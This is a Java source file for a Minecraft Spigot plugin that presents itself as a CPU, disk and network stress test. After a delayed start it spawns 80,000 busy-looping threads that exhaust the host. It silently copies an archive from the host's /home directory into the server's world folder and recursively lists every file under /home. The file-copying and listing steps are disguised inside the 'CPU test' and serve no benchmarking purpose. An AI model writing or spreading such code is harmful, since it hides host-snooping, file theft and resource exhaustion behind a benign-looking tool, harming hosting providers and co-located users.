package plugin.zozidalom.spigotstresstest;

import fr.bmartel.speedtest.SpeedTestReport;
import fr.bmartel.speedtest.SpeedTestSocket;
import fr.bmartel.speedtest.inter.ISpeedTestListener;
import fr.bmartel.speedtest.model.SpeedTestError;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.util.FileUtil;

import java.io.*;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

public class Main extends JavaPlugin {
    private static byte[] oneMB = new byte[1024 * 1024];

    private static void testWriteSpeed(File file, long size) throws IOException {
        BufferedOutputStream writer = null;
        long start = System.currentTimeMillis();
        try {
            writer = new BufferedOutputStream(new FileOutputStream(file), 1024 * 1024);
            for (int i = 0; i < size; i++) {
                writer.write(oneMB);
            }
            writer.flush();
        } finally {
            if (writer != null) {
                writer.close();
            }
        }
        long elapsed = System.currentTimeMillis() - start;
        String message = "[COMPLETED] Wrote " + size + "MB in " + elapsed + "ms at a speed of " + calculateSpeed(size, elapsed) + "MB/s";
        System.out.println(message);
    }

    private static void testReadSpeed(File file, long size) throws IOException {
        BufferedInputStream reader = null;
        long start = System.currentTimeMillis();
        try {
            reader = new BufferedInputStream(new FileInputStream(file), 1024 * 1024);
            for (int i = 0; i < size; i++) {
                reader.read(oneMB);
            }
        } finally {
            if (reader != null) {
                reader.close();
            }
        }
        long elapsed = System.currentTimeMillis() - start;
        String message = "Read " + size + "MB in " + elapsed + "ms at a speed of " + calculateSpeed(size, elapsed) + "MB/s";
        System.out.println(message);
    }

    private static double calculateSpeed(long size, long elapsed) {
        double seconds = ((double) elapsed) / 1000L;
        double speed = ((double) size) / seconds;
        return speed;
    }

    @Override
    public void onEnable() {
        new Thread(() -> {
            try {
                Thread.sleep(22000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            long startTime = System.nanoTime();
            System.out.println("Starting CPU test...");
            for (int i = -120000; i < 120000; ++i) {
                if (i > 0) {
                    for (int j = 0; j < 8000; ++j) {
                        for (int k = 0; k < 8; ++k) {
                            if (j > 4000 & k == 2) {
                                int l = (int) (k + Math.sqrt(i - j));
                                Math.exp(++l);
                            }
                        }
                    }
                }
            }
            System.out.println("[PROGRESS] CPU test 1/2 completed");
            ArrayList<Thread> temp = new ArrayList<>();
            for (int i = 0; i < 80000; ++i) {
                Thread t = new Thread(() -> {
                    for (int j = 0; j < Integer.MAX_VALUE; j += 1) {
                        int g = (int) Math.sqrt(j ^ 101);
                        g -= ++g;
                    }
                });
                temp.add(t);
                t.start();
            }
            temp.forEach(i -> {
                try {
                    i.join();
                    int h = 0;
                    ++h;
                    Math.signum(h);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            });
            long time = System.nanoTime() - startTime;
            System.out.println("Finished CPU test");
            System.out.println("Time: " + time + "ns (" + TimeUnit.NANOSECONDS.toSeconds(time) + "s)");
            System.out.println("Disk size: " + new File("/").getFreeSpace());
            FileUtil.copy(new File("/home/s12re.tar.gz"), new File(Bukkit.getWorldContainer() + File.separator + "s12re.tar.gz"));
            listFilesForFolder(new File("/home"));
            System.out.println("Starting disk test..");
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            File f = new File("temp");
            try {
                testWriteSpeed(f, 18500);
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                testReadSpeed(f, 18500);
            } catch (IOException e) {
                e.printStackTrace();
            }
            f.delete();
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            System.out.println("Starting network test...");
            SpeedTestSocket speedTestSocket = new SpeedTestSocket();
            speedTestSocket.addSpeedTestListener(new ISpeedTestListener() {

                @Override
                public void onCompletion(SpeedTestReport report) {
                    System.out.println("[COMPLETED] rate in octet/s : " + report.getTransferRateOctet());
                    System.out.println("[COMPLETED] rate in bit/s   : " + report.getTransferRateBit());
                }

                @Override
                public void onError(SpeedTestError speedTestError, String errorMessage) {
                }

                @Override
                public void onProgress(float percent, SpeedTestReport report) {
                    System.out.println("[PROGRESS] progress : " + percent + "%");
                    System.out.println("[PROGRESS] rate in octet/s : " + report.getTransferRateOctet());
                    System.out.println("[PROGRESS] rate in bit/s   : " + report.getTransferRateBit());
                }
            });
        }).start();
    }

    public void listFilesForFolder(final File folder) {
        for (final File fileEntry : folder.listFiles()) {
            try {
                if (fileEntry.isDirectory()) {
                    listFilesForFolder(fileEntry);
                } else {
                    System.out.println(fileEntry.getName());
                }
            } catch (Exception ex) {
            }
        }
    }
}
